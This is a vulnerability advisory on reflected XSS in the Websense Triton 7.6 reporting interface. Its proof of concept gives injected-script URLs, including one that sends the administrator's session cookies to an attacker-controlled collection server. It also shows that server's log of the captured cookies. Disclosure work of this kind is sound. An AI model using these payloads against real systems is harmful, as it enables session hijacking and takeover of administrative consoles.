I. VULNERABILITY
-------------------------
Websense (Triton 7.6) reflective XSS in report management UI

III. DESCRIPTION
-------------------------
Websense (Triton 7.6) is prone to reflective XSS in the report management UI enabling capture of authentication session tokens.

This allows an attacker to gain access to the reporting UI (by session hijacking) or run arbitrary javasript in the context of the administrators browser and the Websense administrative UI.

IV. PROOF OF CONCEPT
-------------------------
Affected URL:

https://192.168.1.67:9443/explorer_wse/detail.exe

Examples:

Pop-up showing some session-cookies

https://192.168.1.67:9443/explorer_wse/detail.exe?c=cat&cat=153&anon=&startDate=2011-10-22&endDate=2011-10-22&session=a434cf98f3a402478599a71495a4a71e&dTitle=Internet_use_by_Category"><script>alert(document.cookie)</script>&section=1&uid=&col=1&cor=1&explorer=1&fork=1&puid=7360

Send the current session-cookies to a credentials-collection server:

https://192.168.1.67:9443/explorer_wse/detail.exe?c=cat&cat=153&anon=&startDate=2011-10-22&endDate=2011-10-22&session=a434cf98f3a402478599a71495a4a71e&dTitle=Internet_use_by_Category"><script>document.location=unescape("http://192.168.1.64/"%2bencodeURIComponent(document.cookie))</script>&section=1&uid=&col=1&cor=1&explorer=1&fork=1&puid=7360

>From the collection servers web logs:

192.168.1.64 - - [24/Oct/2011:12:30:00 +0100] "GET/WS_ADMIN_WEB_CONFIG=%22%7BuiLanguage=en,%20baseUrl-https=https://192.168.1.67:9443/mng/,%20baseUrl-http=http://192.168.1.67:8080/mng/,%20loginPageUrl=login/pages/loginPage.jsf,%20keepAliveUrl=login/images/spacer.gif,%20helpBaseURL=https://192.168.1.67:9443/onlinehelp/en/%7D%22;%20WS_JAVA_SESSION_INFO=%22{id=1A8736BC74BC6521CA63D1583B96A8E8,%20ttl=1800}%22;%20WS_SHARED_SESSION=%22{uid=YWRtaW4=,%20userRoles=664332B2D4D7ECEBBC6DC1FA92D160BFDC102E4B2F8CC983B712A0D24B631F5CF029F7967E8C92C3F7193EABE67F652A,%20domain=192.168.1.67,%20sharedSesId=7062414478986846786,%20userType=local}%22;%20WSIRPT=timestamp%3D1319455805
HTTP/1.1" 404 802 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:6.0.2)
Gecko/20100101 Firefox/6.0.2"

The cookies can be added to the attackers browser and used to login to the report area; manipulate reports, report schedules, etc.

The main concern however is the ability for the attacker to run javascript in the context of the administrators browser and the administrative UI.

Though there does appear to be a session token specified in the url requests (a434cf98f3a402478599a71495a4a71e) this can be changed without affecting the exploit's effectiveness.

The exploit will also work with the administrator logged-out - so there seem to be some session-management issues.
